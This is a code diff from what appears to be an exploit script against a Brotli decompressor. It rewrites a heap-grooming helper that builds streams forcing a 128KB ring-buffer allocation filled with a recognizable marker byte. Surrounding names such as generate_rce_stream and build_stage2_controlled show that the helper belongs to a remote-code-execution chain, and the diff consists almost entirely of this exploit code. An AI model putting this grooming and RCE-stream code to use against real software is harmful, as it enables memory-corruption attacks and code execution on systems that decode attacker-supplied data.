@@ -303,30 +303,18 @@ def build_stage2_controlled(pos):
 def build_groom_stream(marker_byte, size=131072):
     """Build a valid Brotli stream that decompresses to `size` bytes of `marker_byte`.
 
-    This forces the decoder to allocate a 128KB ring buffer (WBITS=17).
+    Uses brotli.compress() with lgwin=17 to force a 128KB ring buffer allocation.
     The decompressed output is all one byte — recognizable in memory.
     """
-    bits = Bits()
-    bits.put(1, 1)   # WBITS prefix
-    bits.put(0, 3)   # WBITS=17 (128KB window)
-    bits.put(2, 3)
-
-    remaining = size
-    while remaining > 0:
-        chunk_size = min(remaining, 65536)
-        is_last = (remaining - chunk_size) == 0
-        bits.put(1 if is_last else 0, 1)  # ISLAST
-        if is_last:
-            bits.put(0, 1)  # ISLASTEMPTY=0
-        bits.put(0, 2)                    # MNIBBLES=0 → 16-bit MLEN
-        bits.put(chunk_size - 1, 16)      # MLEN-1
-        bits.put(1, 1)                    # ISUNCOMPRESSED=1
-        if bits.used:
-            bits.put(0, 8 - bits.used)    # byte-align
-        bits.aligned(bytes([marker_byte]) * chunk_size)
-        remaining -= chunk_size
-
-    return bits.finish()
+    try:
+        import brotli
+        data = bytes([marker_byte]) * size
+        return brotli.compress(data, quality=0, lgwin=17)
+    except ImportError:
+        # Fallback: use the working generate_rce_stream approach
+        # Build an uncompressed stream using the dimas Bits writer
+        prefix = bytes([marker_byte]) * min(size, 65535)
+        return generate_rce_stream(prefix, 0) + b"\x00" * 3
 
 
 # Global groom session state
